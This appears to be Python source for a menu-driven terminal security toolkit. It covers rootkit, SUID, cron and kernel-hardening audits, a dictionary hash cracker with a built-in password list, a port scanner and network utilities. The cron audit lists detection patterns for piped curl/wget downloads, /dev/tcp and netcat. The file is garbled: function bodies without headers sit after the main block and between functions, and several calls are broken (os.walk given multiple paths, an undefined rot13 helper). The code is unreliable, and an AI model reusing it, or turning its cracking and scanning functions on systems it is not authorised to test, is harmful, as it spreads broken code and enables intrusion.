        box("WiFi & Wireless", Fore.MAGENTA)
        print(f"  {c('[1]', GREEN)}  WiFi Network Scanner")
        print(f"  {c('[2]', GREEN)}  WiFi Security Audit")
        print(f"  {c('[3]', GREEN)}  Deauth Detection Monitor")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": wifi_scan, "2": wifi_security_audit, "3": wifi_deauth_monitor}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def menu_reports():
    while True:
        box("Report Generator", Fore.CYAN)
        print(f"  {c('[1]', GREEN)}  Generate HTML Report ({c(len(LOG_ALERTS), YELLOW)} alerts)")
        print(f"  {c('[2]', GREEN)}  Export to JSON")
        print(f"  {c('[3]', GREEN)}  Export to CSV")
        print(f"  {c('[b]', CYAN)}   Back\n")
        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
        if ch == "b": break
        act = {"1": report_generate, "2": report_export_json, "3": report_export_csv}
        act.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()


def main():
    print_banner()
    s = spin("Loading modules")
    time.sleep(0.5)
    s.set()
    sys.stdout.write(f"\r  {c(SYM_CHECK, GREEN)}  Modules loaded{' ' * 30}\n\n")
    sys.stdout.flush()
    time.sleep(0.1)
    while True:
        box("Darkie Security Suite v3.0 GOAT Edition", Fore.CYAN)
        print(f"  {c('[1]', RED)}    Network & Threat Monitoring")
        print(f"  {c('[2]', MAGENTA)}  Endpoint Security")
        print(f"  {c('[3]', BLUE)}   Vulnerability Management")
        print(f"  {c('[4]', YELLOW)}  Data & Access Protection")
        print(f"  {c('[5]', GREEN)}   Ethical Hacking & Pentest")
        print(f"  {c('[6]', CYAN)}   SIEM & Log Analysis")
        print(f"  {c('[7]', RED)}    Stress Testing [Fixed]")
        print(f"  {c('[8]', YELLOW)}  OSINT Reconnaissance")
        print(f"  {c('[9]', MAGENTA)}  Telephone Tools")
        print(f"  {c('[10]', BLUE)}  Network Utilities")
        print(f"  {c('[11]', CYAN)}  Hash & Crypto Tools")
        print(f"  {c('[12]', RED)}   System Security Audit")
        print(f"  {c('[13]', BLUE)}  Advanced Network")
        print(f"  {c('[14]', YELLOW)}  Advanced OSINT")
        print(f"  {c('[15]', MAGENTA)}  WiFi & Wireless")
        print(f"  {c('[16]', CYAN)}  Report Generator")
        print(f"  {c('[q]', RED)}    Quit\n")

        choice = input(f"  {c(f'Select module {SYM_PROMPT} ', CYAN)}").strip()
        if choice == "1": menu_network_threat()
        elif choice == "2": menu_endpoint()
        elif choice == "3": menu_vuln()
        elif choice == "4": menu_data()
        elif choice == "5": menu_pentest()
        elif choice == "6": menu_siem()
        elif choice == "7": menu_stress()
        elif choice == "8": menu_osint()
        elif choice == "9": menu_telephone()
        elif choice == "10": menu_netutils()
        elif choice == "11": menu_hash_crypto()
        elif choice == "12": menu_system_audit()
        elif choice == "13": menu_adv_network()
        elif choice == "14": menu_adv_osint()
        elif choice == "15": menu_wifi()
        elif choice == "16": menu_reports()
        elif choice.lower() == "q":
            print(f"\n  {c('Goodbye! Stay secure and ethical.', GREEN)}\n")
            break
        else:
            print(f"  {RED}Invalid choice.{RESET}")


if __name__ == "__main__":
    main()
    box("Rootkit Detection", Fore.RED)
    print(f"  {c('Scanning for common rootkit indicators...', RED)}")
    separator(Fore.RED)
    issues = []
    rootkit_paths = [
        "/usr/bin/.cinik", "/usr/bin/.font-unix", "/usr/lib/libamplify.so",
        "/tmp/.ice-unix", "/dev/shm/.x", "/tmp/.ICE-unix/.x",
        "/usr/share/.hidden", "/var/tmp/.run", "/etc/cron.d/.hidden",
        "/usr/lib/.tcl", "/usr/lib/libamplify.so",
    ]
    for p in rootkit_paths:
        if os.path.exists(p):
            issues.append(f"Rootkit file found: {p}")
            print(f"    {c(SYM_X, RED)} {p}")
            add_log_alert("CRITICAL", "Rootkit", f"File found: {p}")
    if os.path.exists("/etc/passwd"):
        try:
            with open("/etc/passwd") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 7:
                        shell = parts[6]
                        uid = int(parts[2]) if parts[2].isdigit() else -1
                        if uid == 0 and shell not in ("/bin/bash", "/bin/sh", "/bin/zsh", "/usr/bin/bash", "/usr/bin/sh", "/sbin/nologin"):
                            issues.append(f"Root user unusual shell: {parts[0]} -> {shell}")
                            print(f"    {c(SYM_X, RED)} Root shell: {shell} (user: {parts[0]})")
        except Exception:
            pass
    if os.path.exists("/etc/shadow"):
        try:
            st = os.stat("/etc/shadow")
            mode = oct(st.st_mode)[-3:]
            if mode not in ("640", "600"):
                issues.append(f"/etc/shadow permissions too open: {mode}")
                print(f"    {c(SYM_WARN, YELLOW)} /etc/shadow perms: {mode}")
        except Exception:
            pass
    try:
        r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
        hidden = [l for l in r.stdout.splitlines() if l.strip() and not re.search(r'\d+:\d+', l)]
        if len(hidden) > 50:
            issues.append(f"Unusual number of processes: {len(hidden)}")
    except Exception:
        pass
    if issues:
        print(f"\n  {RED}{SYM_WARN} {len(issues)} issues found!{RESET}")
    else:
        print(f"\n  {GREEN}{SYM_CHECK} No rootkit indicators found.{RESET}")
    print()


def audit_suid_scanner():
    box("SUID/SGID Scanner", Fore.RED)
    print(f"  {c('Scanning for dangerous SUID/SGID binaries...', RED)}")
    separator(Fore.RED)
    dangerous = [
        "nmap", "nc", "netcat", "ncat", "vim", "vi", "nano", "less", "more",
        "find", "bash", "sh", "dash", "zsh", "python", "python2", "python3",
        "perl", "ruby", "php", "node", "lua", "wget", "curl", "ssh", "scp",
        "dd", "tar", "zip", "unzip", "chmod", "chown", "systemctl", "journalctl",
        "mount", "umount", "fdisk", "su", "sudo", "passwd", "crontab",
    ]
    found = []
    for root, dirs, files in os.walk("/usr/bin", "/usr/sbin", "/usr/local/bin", "/bin", "/sbin"):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                st = os.stat(fpath)
                is_suid = (st.st_mode & 0o4000) != 0
                is_sgid = (st.st_mode & 0o2000) != 0
                if is_suid or is_sgid:
                    flag = "SUID" if is_suid else "SGID"
                    if fname in dangerous:
                        print(f"    {c(SYM_X, RED)} [{flag}] {c(fpath, YELLOW)} - DANGEROUS")
                        add_log_alert("HIGH", "SUID", f"Dangerous: {fpath} ({flag})")
                        found.append((fpath, flag, True))
                    else:
                        print(f"    {c(SYM_CHECK, GREEN)} [{flag}] {fpath}")
                        found.append((fpath, flag, False))
            except Exception:
                pass
    print(f"\n  {c(f'Found {len(found)} SUID/SGID binaries', GREEN)}")
    danger_count = sum(1 for _, _, d in found if d)
    if danger_count:
        print(f"  {RED}{SYM_WARN} {danger_count} potentially dangerous!{RESET}")
    print()


def audit_cron_jobs():
    box("Cron Job Analyzer", Fore.RED)
    print(f"  {c('Analyzing cron jobs...', RED)}")
    separator(Fore.RED)
    suspicious_patterns = [
        r'curl\s+.*\|', r'wget\s+.*\|', r'bash\s+-c', r'python.*-c',
        r'nc\s+-', r'/dev/tcp', r'base64\s+-d', r'\.onion', r'hidden',
    ]
    cron_paths = ["/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs/"]
    for cp in cron_paths:
        if os.path.isfile(cp):
            try:
                with open(cp) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            print(f"  {c(line, GREEN)}")
                            for pat in suspicious_patterns:
                                if re.search(pat, line, re.IGNORECASE):
                                    print(f"    {c(SYM_WARN, RED)} SUSPICIOUS: {pat}")
                                    add_log_alert("HIGH", "Cron", f"Suspicious cron: {line[:80]}")
            except Exception:
                pass
        elif os.path.isdir(cp):
            try:
                for fname in os.listdir(cp):
                    fpath = os.path.join(cp, fname)
                    try:
                        with open(fpath) as f:
                            for line in f:
                                line = line.strip()
                                if line and not line.startswith("#"):
                                    print(f"  {c(f'[{fname}]', CYAN)} {c(line[:80], GREEN)}")
                                    for pat in suspicious_patterns:
                                        if re.search(pat, line, re.IGNORECASE):
                                            print(f"    {c(SYM_WARN, RED)} SUSPICIOUS")
                                            add_log_alert("HIGH", "Cron", f"Suspicious in {fname}: {line[:80]}")
                    except Exception:
                        pass
            except Exception:
                pass
    try:
        r = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and r.stdout.strip():
            print(f"\n  {c('User crontab:', CYAN)}")
            for line in r.stdout.splitlines():
                if line.strip():
                    print(f"    {c(line, GREEN)}")
    except Exception:
        pass
    print()


def audit_file_permissions():
    box("File Permissions Audit", Fore.RED)
    print(f"  {c('Checking file permissions...', RED)}")
    separator(Fore.RED)
    issues = []
    world_writable = []
    for root, dirs, files in os.walk("/etc"):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                st = os.stat(fpath)
                if st.st_mode & 0o002:
                    world_writable.append(fpath)
            except Exception:
                pass
    if world_writable:
        print(f"  {RED}{SYM_WARN} World-writable files in /etc:{RESET}")
        for f in world_writable[:10]:
            print(f"    {SYM_LV}{SYM_LH} {c(f, RED)}")
        issues.extend(world_writable)
    else:
        print(f"  {c(SYM_CHECK, GREEN)} No world-writable files in /etc")
    if os.path.isdir("/tmp"):
        st = os.stat("/tmp")
        has_sticky = (st.st_mode & 0o1000) != 0
        if has_sticky:
            print(f"  {c(SYM_CHECK, GREEN)} /tmp has sticky bit")
        else:
            print(f"  {c(SYM_X, RED)} /tmp missing sticky bit")
            issues.append("/tmp missing sticky bit")
            add_log_alert("WARN", "Permissions", "/tmp missing sticky bit")
    if issues:
        print(f"\n  {RED}{SYM_WARN} {len(issues)} issues!{RESET}")
    else:
        print(f"\n  {GREEN}{SYM_CHECK} All checks passed.{RESET}")
    print()


def audit_open_ports():
    box("Open Ports Summary", Fore.RED)
    print(f"  {c('Quick system port check...', RED)}")
    separator(Fore.RED)
    listen_ports = []
    if HAS_PSUTIL:
        try:
            for cn in psutil.net_connections():
                if cn.status and "listen" in cn.status.lower():
                    laddr = f"{cn.laddr.ip}:{cn.laddr.port}" if cn.laddr else "?:?"
                    pid = cn.pid or 0
                    pname = ""
                    try:
                        pname = psutil.Process(pid).name() if pid else ""
                    except Exception:
                        pass
                    listen_ports.append((cn.laddr.port if cn.laddr else 0, laddr, pname, pid))
        except Exception:
            pass
    else:
        try:
            r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 4:
                    listen_ports.append((0, parts[3], parts[-1] if len(parts) > 5 else "", 0))
        except Exception:
            pass
    if listen_ports:
        print(f"  {c('Listening Ports:', CYAN)}")
        for port, addr, pname, pid in sorted(listen_ports):
            print(f"    {c(f'{port:5d}', GREEN)} {c(addr, CYAN):25s} {c(pname, YELLOW)} PID:{pid}")
        print(f"\n  {c(f'Total: {len(listen_ports)} listening', GREEN)}")
    else:
        print(f"  {YELLOW}No listening ports detected.{RESET}")
    print()


def audit_failed_logins():
    box("Failed Login Analyzer", Fore.RED)
    print(f"  {c('Analyzing authentication logs...', RED)}")
    separator(Fore.RED)
    if platform.system().lower() != "linux":
        print(f"  {YELLOW}Linux-only feature.{RESET}")
        return
    logs = ["/var/log/auth.log", "/var/log/secure"]
    total_fails = 0
    ip_fails = defaultdict(int)
    user_fails = defaultdict(int)
    for lf in logs:
        if os.path.exists(lf):
            try:
                content = open(lf).read()
                fails = re.findall(r'Failed password for (\w+) from (\S+)', content)
                for user, ip in fails:
                    total_fails += 1
                    ip_fails[ip] += 1
                    user_fails[user] += 1
            except Exception:
                pass
    if total_fails > 0:
        print(f"  {RED}{SYM_WARN} {total_fails} failed logins detected!{RESET}")
        print(f"\n  {c('Top attacking IPs:', CYAN)}")
        for ip, cnt in sorted(ip_fails.items(), key=lambda x: -x[1])[:10]:
            color = Fore.RED if cnt > 20 else Fore.YELLOW
            print(f"    {c(ip, color):25s} {c(str(cnt), CYAN)} attempts")
        print(f"\n  {c('Targeted users:', CYAN)}")
        for user, cnt in sorted(user_fails.items(), key=lambda x: -x[1])[:10]:
            print(f"    {c(user, GREEN):25s} {c(str(cnt), CYAN)} attempts")
        add_log_alert("WARN", "FailedLogins", f"{total_fails} total failures from {len(ip_fails)} IPs")
    else:
        print(f"  {GREEN}{SYM_CHECK} No failed logins found.{RESET}")
    print()


def audit_kernel_hardening():
    box("Kernel Hardening Check", Fore.RED)
    print(f"  {c('Checking sysctl security parameters...', RED)}")
    separator(Fore.RED)
    checks = [
        ("net.ipv4.tcp_syncookies", "SYN cookies", "1"),
        ("net.ipv4.ip_forward", "IP forwarding", "0"),
        ("net.ipv4.conf.all.accept_redirects", "ICMP redirects", "0"),
        ("net.ipv4.conf.all.send_redirects", "Send redirects", "0"),
        ("net.ipv4.conf.all.accept_source_route", "Source routing", "0"),
        ("net.ipv4.icmp_echo_ignore_broadcasts", "Ignore broadcast pings", "1"),
        ("net.ipv4.conf.all.log_martians", "Log martian packets", "1"),
        ("kernel.randomize_va_space", "ASLR", "2"),
        ("fs.suid_dumpable", "SUID core dumps", "0"),
        ("kernel.exec-shield", "Exec-shield", "1"),
    ]
    issues = 0
    for param, desc, expected in checks:
        try:
            r = subprocess.run(["sysctl", param], capture_output=True, text=True, timeout=3)
            val = r.stdout.strip().split("=")[-1].strip() if r.returncode == 0 else "N/A"
            if val == expected:
                print(f"    {c(SYM_CHECK, GREEN)} {desc:30s} {c(val, GREEN)}")
            else:
                print(f"    {c(SYM_X, RED)} {desc:30s} {c(val, YELLOW)} (expected {expected})")
                issues += 1
                add_log_alert("WARN", "KernelHardening", f"{desc} = {val} (expected {expected})")
        except Exception:
            print(f"    {c('?', YELLOW)} {desc:30s} {c('N/A', YELLOW)}")
    if issues:
        print(f"\n  {RED}{SYM_WARN} {issues} parameters need attention!{RESET}")
    else:
        print(f"\n  {GREEN}{SYM_CHECK} All checks passed.{RESET}")
    print()
    box("Hash Generator", Fore.CYAN)
    text = input(f"  {c(f'Input text {SYM_PROMPT} ', CYAN)}").strip()
    if not text:
        return
    algo = input(f"  {c(f'Algorithm (md5/sha1/sha256/sha512/all) {SYM_PROMPT} ', CYAN)}").strip().lower() or "all"
    print(f"\n  {c('Hashes:', CYAN)}")
    separator(Fore.CYAN)
    algos = ["md5", "sha1", "sha256", "sha384", "sha512"] if algo == "all" else [algo]
    for a in algos:
        try:
            h = hashlib.new(a)
            h.update(text.encode())
            print(f"  {c(f'{a.upper():8s}', GREEN)} {c(h.hexdigest(), YELLOW)}")
        except ValueError:
            print(f"  {c(f'{a.upper():8s}', RED)} Unknown algorithm")
    print()


def hash_identifier():
    box("Hash Identifier", Fore.CYAN)
    h = input(f"  {c(f'Hash {SYM_PROMPT} ', CYAN)}").strip()
    if not h:
        return
    length = len(h)
    print(f"\n  {c('Analysis:', CYAN)}")
    separator(Fore.CYAN)
    print(f"  Length: {c(str(length), GREEN)} chars")
    is_hex = bool(re.match(r'^[0-9a-fA-F]+$', h))
    is_b64 = bool(re.match(r'^[A-Za-z0-9+/]+={0,2}$', h))
    print(f"  Hex: {c(SYM_CHECK if is_hex else SYM_X, GREEN if is_hex else RED)}")
    print(f"  Base64: {c(SYM_CHECK if is_b64 else SYM_X, GREEN if is_b64 else RED)}")
    candidates = []
    if length == 32 and is_hex:
        candidates.append("MD5")
    elif length == 40 and is_hex:
        candidates.append("SHA-1")
    elif length == 64 and is_hex:
        candidates.append("SHA-256")
    elif length == 96 and is_hex:
        candidates.append("SHA-384")
    elif length == 128 and is_hex:
        candidates.append("SHA-512")
    elif length == 56 and is_hex:
        candidates.append("SHA-224")
    elif length == 34 and h.startswith("$2"):
        candidates.append("bcrypt")
    elif length == 43 and is_b64:
        candidates.append("Base64 SHA-256 (JWT)")
    elif length == 22 and is_b64:
        candidates.append("bcrypt (truncated)")
    if candidates:
        print(f"\n  {c('Likely types:', CYAN)}")
        for name in candidates:
            print(f"    {SYM_LV}{SYM_LH} {c(name, GREEN)}")
    else:
        print(f"\n  {YELLOW}Could not determine type. Try other tools.{RESET}")
    print()


def hash_cracker():
    box("Hash Cracker (Dictionary Attack)", Fore.CYAN)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    target = input(f"  {c(f'Hash to crack {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    algo = input(f"  {c(f'Algorithm (md5/sha1/sha256) {SYM_PROMPT} ', CYAN)}").strip().lower() or "md5"
    wordlist = input(f"  {c(f'Wordlist path (leave empty for built-in) {SYM_PROMPT} ', CYAN)}").strip()
    words = []
    if wordlist and os.path.exists(wordlist):
        try:
            with open(wordlist, errors="ignore") as wf:
                words = [w.strip() for w in wf.readlines() if w.strip()]
        except Exception:
            pass
    if not words:
        words = ["password", "123456", "admin", "root", "test", "letmein", "welcome",
                 "qwerty", "abc123", "password1", "monkey", "dragon", "master", "1234567890",
                 "passw0rd", "shadow", "12345", "1234", "iloveyou", "sunshine", "princess",
                 "football", "charlie", "michael", "login", "hello", "trustno1",
                 "batman", "access", "superman", "harley", "mustang", "hunter2", "thomas",
                 "ashley", "bailey", "passpass", "000000", "secret", "summer", "winter",
                 "spring", "autumn", "admin123", "root123", "toor", "changeme", "default"]
    print(f"\n  {c(f'Cracking {len(words)} words against {algo.upper()}...', CYAN)}")
    separator(Fore.CYAN)
    found = False
    for i, word in enumerate(words):
        try:
            h = hashlib.new(algo)
            h.update(word.encode())
            if h.hexdigest().lower() == target.lower():
                print(f"\n  {RED}{SYM_WARN} CRACKED: {c(word, RED)}{RESET}")
                add_log_alert("HIGH", "HashCrack", f"Cracked {algo}: {word}")
                found = True
                break
        except Exception:
            pass
        if i % 50 == 0:
            sys.stdout.write(f"\r  {progress_bar(i, len(words))}  ")
            sys.stdout.flush()
    if not found:
        print(f"\n  {GREEN}{SYM_CHECK} Not found in dictionary.{RESET}")
    print()


def encoder_decoder():
    box("Encoder / Decoder", Fore.CYAN)
    print(f"\n  {c('Options:', CYAN)}")
    print(f"  {c('[1]', GREEN)}  Base64 Encode       {c('[2]', GREEN)}  Base64 Decode")
    print(f"  {c('[3]', GREEN)}  URL Encode          {c('[4]', GREEN)}  URL Decode")
    print(f"  {c('[5]', GREEN)}  HTML Entity Encode  {c('[6]', GREEN)}  HTML Entity Decode")
    print(f"  {c('[7]', GREEN)}  Hex Encode          {c('[8]', GREEN)}  Hex Decode")
    print(f"  {c('[9]', GREEN)}  ROT13               {c('[10]', GREEN)}  ROT47")
    print(f"  {c('[11]', GREEN)} Binary Encode       {c('[12]', GREEN)} Binary Decode")
    print(f"  {c('[13]', GREEN)} Morse Code Encode   {c('[14]', GREEN)} Morse Code Decode")
    ch = input(f"\n  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
    text = input(f"  {c(f'Text {SYM_PROMPT} ', CYAN)}").strip()
    if not text or not ch:
        return
    MORSE = {".-":"A","-...":"B","-.-.":"C","-..":"D",".":"E","..-.":"F","--.":"G","....":"H","..":"I",".---":"J","-.-":"K",".-..":"L","--":"M","-.":"N","---":"O",".--.":"P","--.-":"Q",".-.":"R","...":"S","-":"T","..-":"U","...-":"V",".--":"W","-..-":"X","-.--":"Y","--..":"Z","-----":"0",".----":"1","..---":"2","...--":"3","....-":"4",".....":"5","-....":"6","--...":"7","---..":"8","----.":"9"}
    MORSE_REV = {v: k for k, v in MORSE.items()}
    result = ""
    try:
        if ch == "1":
            result = base64.b64encode(text.encode()).decode()
        elif ch == "2":
            result = base64.b64decode(text).decode(errors="replace")
        elif ch == "3":
            result = quote(text)
        elif ch == "4":
            result = unquote(text)
        elif ch == "5":
            result = html.escape(text)
        elif ch == "6":
            result = html.unescape(text)
        elif ch == "7":
            result = text.encode().hex()
        elif ch == "8":
            result = bytes.fromhex(text).decode(errors="replace")
        elif ch == "9":
            result = codecs_rot13(text) if 'codecs' in dir() else re.sub(r'[a-zA-Z]', lambda m: chr((ord(m.group()) - 65 + 13) % 26 + 65) if m.group().isupper() else chr((ord(m.group()) - 97 + 13) % 26 + 97), text)
        elif ch == "10":
            result = ""
            for ch_r in text:
                o = ord(ch_r)
                if 33 <= o <= 126:
                    result += chr(33 + ((o - 33 + 47) % 94))
                else:
                    result += ch_r
        elif ch == "11":
            result = " ".join(format(b, "08b") for b in text.encode())
        elif ch == "12":
            result = "".join(chr(int(b, 2)) for b in text.split() if len(b) == 8)
        elif ch == "13":
            result = " ".join(MORSE_REV.get(c.upper(), "") for c in text if c.isalnum() or c == " ")
            result = re.sub(r'  +', '  ', result).strip()
        elif ch == "14":
            words = text.split("  ")
            result = "".join(MORSE.get(w.strip(), "") for w in words)
        else:
            print(f"  {RED}Invalid choice.{RESET}")
            return
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
        return
    print(f"\n  {c('Result:', CYAN)}")
    print(f"  {c(result, GREEN)}")
    print()


def password_generator():
    box("Password Generator", Fore.CYAN)
    length = input(f"  {c(f'Length (16) {SYM_PROMPT} ', CYAN)}").strip()
    length = int(length) if length.isdigit() and int(length) >= 4 else 16
    use_upper = input(f"  {c(f'Uppercase? (y/n, y) {SYM_PROMPT} ', CYAN)}").strip().lower() != "n"
    use_lower = input(f"  {c(f'Lowercase? (y/n, y) {SYM_PROMPT} ', CYAN)}").strip().lower() != "n"
    use_digits = input(f"  {c(f'Digits? (y/n, y) {SYM_PROMPT} ', CYAN)}").strip().lower() != "n"
    use_symbols = input(f"  {c(f'Symbols? (y/n, y) {SYM_PROMPT} ', CYAN)}").strip().lower() != "n"
    count = input(f"  {c(f'How many? (5) {SYM_PROMPT} ', CYAN)}").strip()
    count = int(count) if count.isdigit() and int(count) >= 1 else 5
    charset = ""
    if use_upper:
        charset += string.ascii_uppercase
    if use_lower:
        charset += string.ascii_lowercase
    if use_digits:
        charset += string.digits
    if use_symbols:
        charset += "!@#$%^&*()_+-=[]{}|;:,.<>?"
    if not charset:
        print(f"  {RED}{SYM_X} At least one character class required.{RESET}")
        return
    print(f"\n  {c('Generated Passwords:', CYAN)}")
    separator(Fore.CYAN)
    for _ in range(count):
        pw = "".join(random.SystemRandom().choice(charset) for _ in range(length))
        print(f"    {c(pw, GREEN)}")
    print()
    box("Telephone Number Analysis", Fore.MAGENTA)
    num = input(f"  {c(f'Number {SYM_PROMPT} ', CYAN)}").strip()
    if not num:
        return
    cleaned = re.sub(r'[^\d+]', '', num)
    if not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    lines = [f"  Number: {c(cleaned, GREEN)}"]
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code):
            lines.append(f"  Country: {c(country, YELLOW)}")
            break
    info_box("Telephone", lines, Fore.MAGENTA)
    print()


def tel_country_codes():
    box("Country Codes", Fore.MAGENTA)
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: int(x[0])):
        print(f"    +{code:4s}  {c(country, GREEN)}")
    print()


def tel_format():
    box("Phone Formatter", Fore.MAGENTA)
    num = input(f"  {c(f'Number {SYM_PROMPT} ', CYAN)}").strip()
    if not num:
        return
    d = re.sub(r'[^\d]', '', num)
    print(f"  {c('Formats:', CYAN)}")
    print(f"    Raw: {c(d, GREEN)}")
    print(f"    Intl: {c('+'+d, GREEN)}")
    if len(d) == 11 and d.startswith('1'):
        print(f"    US: {c(f'+1({d[1:4]}){d[4:7]}-{d[7:]}', GREEN)}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 10: NETWORK UTILITIES
# ──────────────────────────────────────────────────────────

def legacy_portscan():
    box("TCP Port Scanner", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {c(f'{SYM_CHECK} {target} -> {ip}', GREEN)}")
        except Exception:
            print(f"  {RED}Could not resolve.{RESET}")
            return
    print(f"  {c('[1]', GREEN)} Top 30  [2] Top 1000  [3] Custom")
    ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
    if ch == "2":
        ports = list(range(1, 1025))
    elif ch == "3":
        try:
            r_in = input(f"  {c(f'Range (e.g. 1-1000) {SYM_PROMPT} ', CYAN)}").strip()
            parts = r_in.split("-")
            ports = list(range(int(parts[0]), int(parts[1])+1))
        except Exception:
            ports = COMMON_PORTS
    else:
        ports = COMMON_PORTS
    open_ports = _scan_ports(ip, ports)
    print(f"\n  {c(f'{SYM_CHECK} {len(open_ports)}/{len(ports)} open', GREEN)}")
    for p in sorted(open_ports):
        try:
            svc = socket.getservbyport(p)
        except OSError:
            svc = "?"
        print(f"    {SYM_LV}{SYM_LH} {c(f'{p:5d}', GREEN)} ({c(svc, CYAN)})")
    print()


def legacy_sslcheck():
    box("SSL/TLS Checker", Fore.BLUE)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not domain:
        return
    p_in = input(f"  {c(f'Port (443) {SYM_PROMPT} ', CYAN)}").strip()
    port = int(p_in) if p_in.isdigit() else 443
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ss:
                cert = ss.getpeercert()
        if cert:
            subj = dict(x[0] for x in cert.get("subject", []))
            iss = dict(x[0] for x in cert.get("issuer", []))
            na = cert.get("notAfter", "")
            lines = [
                f"  Subject: {c(subj.get('commonName', '?'), GREEN)}",
                f"  Issuer: {c(iss.get('organizationName', '?'), YELLOW)}",
                f"  Expires: {c(na, MAGENTA)}",
            ]
            try:
                exp = dt.strptime(na, "%b %d %H:%M:%S %Y %Z")
                days = (exp - dt.now()).days
                lines.append(f"  Days left: {c(str(days), RED if days < 30 else GREEN)}")
            except Exception:
                pass
            info_box("SSL Certificate", lines, Fore.BLUE)
        else:
            print(f"  {RED}No cert.{RESET}")
    except Exception as e:
        print(f"  {RED}Error: {e}{RESET}")
    print()


def legacy_httpheaders():
    box("HTTP Security Headers", Fore.BLUE)
    url = input(f"  {c(f'URL {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "DarkieV3/1.0"})
        lines = [f"  URL: {c(r.url, GREEN)}", f"  Status: {c(str(r.status_code), YELLOW)}"]
        sec_h = {"Strict-Transport-Security": "HSTS", "Content-Security-Policy": "CSP",
                 "X-Frame-Options": "XFO", "X-Content-Type-Options": "XCTO",
                 "Referrer-Policy": "Referrer", "Permissions-Policy": "Permissions"}
        for h, lbl in sec_h.items():
            if h in r.headers:
                lines.append(f"  {lbl:10s}: {c(r.headers[h][:45], GREEN)}")
            else:
                lines.append(f"  {lbl:10s}: {c('Not set', RED)}")
        info_box("Security Headers", lines, Fore.BLUE)
        present = sum(1 for h in sec_h if h in r.headers)
        pct = present / len(sec_h) * 100
        grade = c(f"Grade: {'A' if pct>=70 else 'C' if pct>=40 else 'F'} ({pct:.0f}%)",
                  GREEN if pct>=70 else YELLOW if pct>=40 else RED)
        print(f"  {c('Rating:', CYAN)} {grade}")
    except Exception as e:
        print(f"  {RED}Error: {e}{RESET}")
    print()


def legacy_ping():
    box("Ping", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    c_in = input(f"  {c(f'Count (4) {SYM_PROMPT} ', CYAN)}").strip()
    cnt = int(c_in) if c_in.isdigit() else 4
    param = "-n" if platform.system().lower() == "windows" else "-c"
    try:
        r = subprocess.run(["ping", param, str(cnt), target], capture_output=True, text=True, timeout=30)
        for line in (r.stdout or r.stderr).splitlines():
            if any(x in line.lower() for x in ["round-trip","rtt","min/avg/max","packets","transmitted","received","loss","ttl=","time="]):
                print(f"  {c(line, GREEN)}")
        if r.returncode == 0:
            print(f"\n  {c(f'{SYM_CHECK} Host alive', GREEN)}")
        else:
            print(f"\n  {c(f'{SYM_X} Host unreachable', RED)}")
    except Exception as e:
        print(f"  {RED}Error: {e}{RESET}")
    print()


def legacy_traceroute():
    box("Traceroute", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    cmd = ["tracert", "-d", "-h", "20"] if platform.system().lower() == "windows" else ["traceroute", "-n", "-m", "20"]
    cmd.append(target)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        for line in (r.stdout or r.stderr).splitlines()[:25]:
            if line.strip():
                print(f"  {c(line, GREEN)}")
    except Exception:
        print(f"  {YELLOW}traceroute not available.{RESET}")
    print()
